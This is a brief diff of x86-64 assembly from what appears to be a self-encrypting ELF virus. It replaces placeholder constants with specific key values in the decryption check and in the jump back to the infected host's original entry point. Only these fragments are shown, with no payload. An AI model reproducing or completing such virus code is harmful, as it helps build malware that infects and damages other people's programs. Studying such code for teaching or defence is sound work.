@@ -6,8 +6,8 @@ global _start
 _start:
 	PUSHAQ
 key:
-	mov rdi, 0x1111111111111111
-	mov rsi, 0x1111111111111111
+	mov rdi, 0x8037ee39550c7610
+	mov rsi, 0x8037ee39550c7610
 	cmp rdi, rsi
 	je main
 	lea rsi, [rel encryption_start]
@@ -975,8 +975,8 @@ ret_1:
 	ret
 
 jmp_old_entry:
-	mov rdi, 0x1111111111111111
-	mov rsi, 0x1111111111111111
+	mov rdi, 0x2322a163f2fcad26
+	mov rsi, 0x2322a163f2fcad26
 	cmp rdi, rsi
 	jne the_jump							; exit if real famine
 		mov rax, 60
